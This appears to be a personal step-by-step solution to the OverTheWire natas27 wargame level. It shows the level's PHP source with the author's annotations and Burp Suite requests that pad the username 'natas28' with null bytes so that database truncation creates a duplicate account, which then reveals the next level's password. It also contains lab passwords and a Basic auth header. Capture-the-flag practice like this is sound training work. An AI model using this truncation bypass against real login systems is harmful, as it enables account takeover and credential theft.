@@ -1,0 +1,213 @@
+PASSWORD: u3RRffXjysjgwFU6b9xa23i6prmUsYne
+
+Username: natas28
+Password
+
+URL: http://natas27.natas.labs.overthewire.org/index.php
+Wrong password for user: natas28
+
+*VIEW SOURCECODE*
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas27", "pass": "<censored>" };</script></head>
+<body>
+<h1>natas27</h1>
+<div id="content">
+<?php
+
+// morla / 10111
+// database gets cleared every 5 min
+
+
+/*
+CREATE TABLE `users` (
+  `username` varchar(64) DEFAULT NULL,  <---------USERNAME CAN HAVE UPTO 64 CHARACTERS*
+  `password` varchar(64) DEFAULT NULL
+);
+*/
+
+
+function checkCredentials($link,$usr,$pass){
+
+    $user=mysqli_real_escape_string($link, $usr);  
+    $password=mysqli_real_escape_string($link, $pass);  
+
+    $query = "SELECT username from users where username='$user' and password='$password' ";
+    $res = mysqli_query($link, $query);
+    if(mysqli_num_rows($res) > 0){
+        return True;
+    }
+    return False;
+}
+
+
+function validUser($link,$usr){
+
+    $user=mysqli_real_escape_string($link, $usr);
+
+    $query = "SELECT * from users where username='$user'";
+    $res = mysqli_query($link, $query);
+    if($res) {
+        if(mysqli_num_rows($res) > 0) {
+            return True;
+        }
+    }
+    return False;
+}
+
+
+function dumpData($link,$usr){
+
+    $user=mysqli_real_escape_string($link, trim($usr));
+
+    $query = "SELECT * from users where username='$user'";
+    $res = mysqli_query($link, $query);
+    if($res) {
+        if(mysqli_num_rows($res) > 0) {
+            while ($row = mysqli_fetch_assoc($res)) {
+                // thanks to Gobo for reporting this bug!
+                //return print_r($row);
+                return print_r($row,true);
+            }
+        }
+    }
+    return False;
+}
+
+
+function createUser($link, $usr, $pass){
+
+    if($usr != trim($usr)) {  <----------TRIM - REMOVES WHITE ALL WHITE SPACES IE 'admin'OR1=1--' ('admin' OR 1=1 -- ')
+        echo "Go away hacker"; <----------HA! HA! HA!
+        return False;
+    }
+    $user=mysqli_real_escape_string($link, substr($usr, 0, 64));  <----------CHECKING USERNAME FOR SQL INJECTION ATTACKS - DATABSE IS ONLY GOING TO ACCEPT 64 SUBSTRING CHARACTERS*
+    $password=mysqli_real_escape_string($link, substr($pass, 0, 64));  <----------CHECKING PASSWORD FOR SQL INJECTON ATTACKS*
+
+    $query = "INSERT INTO users (username,password) values ('$user','$password')";
+    $res = mysqli_query($link, $query);
+    if(mysqli_affected_rows($link) > 0){
+        return True;
+    }
+    return False;
+}
+
+
+if(array_key_exists("username", $_REQUEST) and array_key_exists("password", $_REQUEST)) {
+    $link = mysqli_connect('localhost', 'natas27', '<censored>');
+    mysqli_select_db($link, 'natas27');
+
+
+    if(validUser($link,$_REQUEST["username"])) {
+        //user exists, check creds
+        if(checkCredentials($link,$_REQUEST["username"],$_REQUEST["password"])){
+            echo "Welcome " . htmlentities($_REQUEST["username"]) . "!<br>";
+            echo "Here is your data:<br>";
+            $data=dumpData($link,$_REQUEST["username"]);
+            print htmlentities($data);
+        }
+        else{
+            echo "Wrong password for user: " . htmlentities($_REQUEST["username"]) . "<br>";
+        }
+    }
+    else {
+        //user doesn't exist
+        if(createUser($link,$_REQUEST["username"],$_REQUEST["password"])){
+            echo "User " . htmlentities($_REQUEST["username"]) . " was created!";
+        }
+    }
+
+    mysqli_close($link);
+} else {
+?>
+
+<form action="index.php" method="POST">
+Username: <input name="username"><br>
+Password: <input name="password" type="password"><br>
+<input type="submit" value="login" />
+</form>
+<?php } ?>
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+
+*BURP SUITE*
+*TOGGLE intercep is on
+*SEND TO REPEATER*
+*TOGGLE REPEATER*
+POST /index.php HTTP/1.1
+Host: natas27.natas.labs.overthewire.org
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 204
+Origin: http://natas27.natas.labs.overthewire.org
+Authorization: Basic bmF0YXMyNzp1M1JSZmZYanlzamd3RlU2Yjl4YTIzaTZwcm1Vc1luZQ==
+Connection: close
+Referer: http://natas27.natas.labs.overthewire.org/
+Cookie: _ga_RD0K2239G0=GS1.1.1718037651.6.0.1718037651.0.0.0; _ga=GA1.1.54566035.1717921097
+Upgrade-Insecure-Requests: 1
+
+username=natas28%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00a&password=123  <----------ADD FIFTY-SEVEN NULL CHARACTERS (%00) TO USERNAME AND A CHARACTER*
+
+*TOGGLE SEND*
+*RIGHT CLICK RESPONSE*
+*SHOW RESPONSE IN BROWSER*
+*COPY AND PASTE IN WEB BROWSER*
+http://natas27.natas.labs.overthewire.org/index.php
+User natas28a was created!
+
+*WEB BROWSER*
+*VIEW SOURCECODE*
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas27", "pass": "u3RRffXjysjgwFU6b9xa23i6prmUsYne" };</script></head>
+<body>
+<h1>natas27</h1>
+<div id="content">
+User natas28%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00a was created!
+
+*BURP SUITE*
+*SEND TO REPEATER AGAIN*
+*USING ONLY NATAS28, USING THE SAME PASSWORD*
+POST /index.php HTTP/1.1
+Host: natas27.natas.labs.overthewire.org
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 29
+Origin: http://natas27.natas.labs.overthewire.org
+Authorization: Basic bmF0YXMyNzp1M1JSZmZYanlzamd3RlU2Yjl4YTIzaTZwcm1Vc1luZQ==
+Connection: close
+Referer: http://natas27.natas.labs.overthewire.org/
+Cookie: _ga_RD0K2239G0=GS1.1.1718037651.6.0.1718037651.0.0.0; _ga=GA1.1.54566035.1717921097
+Upgrade-Insecure-Requests: 1
+
+username=natas28&password=123  <----------USING ONLY NATAS28, USING THE SAME PASSWORD*
+
+*TOGGLE SEND*
+*RIGHT CLICK RESPONSE*
+*SHOW RESPONSE IN BROWSER*
+*COPY AND PASTE IN WEB BROWSER*
+Welcome natas28!
+Here is your data:
+Array ( [username] => natas28 [password] => 1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj )
